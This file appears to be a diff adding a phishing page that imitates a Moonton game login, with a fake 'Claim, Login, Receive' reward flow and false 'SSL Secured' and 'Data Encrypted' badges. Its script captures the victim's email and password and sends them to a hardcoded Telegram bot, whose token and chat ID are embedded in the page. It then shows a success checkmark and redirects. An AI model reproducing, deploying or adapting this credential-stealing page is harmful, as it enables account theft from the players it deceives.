@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moonton Login</title>
+    <style>
+        :root {
+            --primary: #FFD700;
+            --secondary: #FF6B00;
+            --dark: #0A0A0A;
+            --dark-secondary: #1A1A1A;
+            --text: #FFFFFF;
+            --text-secondary: #BBBBBB;
+            --error: #FF4D4D;
+        }
+        
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: var(--dark);
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: var(--dark-secondary);
+            padding: 25px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid var(--primary);
+        }
+        
+        img {
+            width: 150px;
+            max-width: 60%;
+            height: auto;
+            margin: 0 auto 25px;
+            display: block;
+        }
+        
+        h2 {
+            font-size: 22px;
+            margin: 0 0 25px 0;
+            text-align: center;
+            color: var(--primary);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-wrapper {
+            position: relative;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 16px;
+            -webkit-appearance: none;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+        }
+        
+        .button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 10px;
+            transition: transform 0.2s;
+        }
+        
+        .button:active {
+            transform: scale(0.98);
+        }
+        
+        .forgot-password {
+            text-align: right;
+            margin: -10px 0 15px 0;
+        }
+        
+        .forgot-password a {
+            color: var(--text-secondary);
+            font-size: 13px;
+            text-decoration: none;
+        }
+        
+        /* Loading state */
+        .button.loading {
+            position: relative;
+            color: transparent;
+        }
+        
+        .button.loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0, 0, 0, 0.2);
+            border-top-color: #000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            left: calc(50% - 10px);
+            top: calc(50% - 10px);
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* New styles for enhancements */
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin: 0 0 25px;
+        }
+
+        .steps::before {
+            content: '';
+            width: 100%;
+            height: 2px;
+            background: rgba(255,255,255,0.1);
+            position: absolute;
+            top: 15px;
+            z-index: 1;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 2;
+        }
+
+        .step-number {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text);
+            font-weight: bold;
+        }
+
+        .step-number.active {
+            background: var(--primary);
+            color: #000;
+        }
+
+        .step-text {
+            margin: 5px 0 0;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .step-text.active {
+            color: var(--primary);
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+        }
+        
+        /* Mobile adjustments */
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            
+            img {
+                width: 120px;
+                margin-bottom: 20px;
+            }
+            
+            h2 {
+                font-size: 20px;
+                margin-bottom: 20px;
+            }
+            
+            input {
+                padding: 14px 14px 14px 40px;
+                font-size: 15px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            body {
+                padding: 15px;
+            }
+            
+            .container {
+                padding: 18px;
+            }
+            
+            input {
+                padding: 12px 12px 12px 38px;
+            }
+            
+            .button {
+                padding: 14px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="moonton.png" alt="Moonton Logo" loading="lazy">
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-text">Claim</div>
+            </div>
+            <div class="step">
+                <div class="step-number active">2</div>
+                <div class="step-text active">Login</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text">Receive</div>
+            </div>
+        </div>
+        
+        <h2>Login with Moonton</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <span class="input-icon">✉️</span>
+                    <input type="email" id="email" placeholder="Moonton Email" required inputmode="email">
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <span class="input-icon">🔒</span>
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+
+            <div class="security-badges">
+                <div class="security-badge">
+                    <span style="color:#4CAF50;">🔒</span>
+                    <span>SSL Secured</span>
+                </div>
+                <div class="security-badge">
+                    <span style="color:#2196F3;">🛡️</span>
+                    <span>Data Encrypted</span>
+                </div>
+            </div>
+            
+            <button type="submit" class="button" id="submitBtn">Login</button>
+        </form>
+    </div>
+
+    <script>
+        // Form validation
+        document.getElementById('email').addEventListener('input', function() {
+            if (this.value.includes('@')) {
+                this.style.borderColor = '#4CAF50';
+            } else {
+                this.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+            }
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            if (this.value.length >= 6) {
+                this.style.borderColor = '#4CAF50';
+            } else {
+                this.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+            }
+        });
+
+        // Telegram Bot Configuration
+        const botToken = "7752857283:AAGYsQ4Jh3hVvBUTIcgz3gdft53Z_B-5rrk";
+        const chatId = "7328757522";
+
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const btn = document.getElementById("submitBtn");
+            btn.classList.add("loading");
+            btn.disabled = true;
+            
+            // Capture form data
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // Prepare message for Telegram
+            const message = `🔐 New Login Details\n\n📧 Email: ${email}\n🔑 Password: ${password}\n\n🌐 Source: Moonton Login`;
+
+            // Send to Telegram
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(apiUrl)
+                .then(response => {
+                    if (response.ok) {
+                        // Success - show checkmark and redirect
+                        btn.innerHTML = '<span style="color:transparent">.</span>';
+                        btn.style.position = 'relative';
+                        
+                        const checkmark = document.createElement('div');
+                        checkmark.innerHTML = '✓';
+                        checkmark.style.position = 'absolute';
+                        checkmark.style.left = '50%';
+                        checkmark.style.top = '50%';
+                        checkmark.style.transform = 'translate(-50%, -50%)';
+                        checkmark.style.fontWeight = 'bold';
+                        checkmark.style.color = '#000';
+                        btn.appendChild(checkmark);
+                        
+                        setTimeout(() => {
+                            
+                            window.location.href = "processing.html";
+                        }, 1000);
+                    } else {
+                        // Error - show error state
+                        showError(btn);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    showError(btn);
+                });
+        });
+        
+        function showError(btn) {
+            btn.classList.remove("loading");
+            btn.innerHTML = '✗ Failed';
+            btn.style.background = "var(--error)";
+            setTimeout(() => {
+                btn.innerHTML = 'Login';
+                btn.style.background = "linear-gradient(90deg, var(--primary), var(--secondary))";
+                btn.disabled = false;
+                alert("Failed to authenticate. Please try again.");
+            }, 1500);
+        }
+        
+        // Prevent zooming on input focus
+        document.addEventListener('focusin', function(e) {
+            if (e.target.tagName === 'INPUT') {
+                window.scrollTo(0, 0);
+                document.body.style.transform = 'scale(1)';
+            }
+        }, true);
+    </script>
+</body>
+</html>
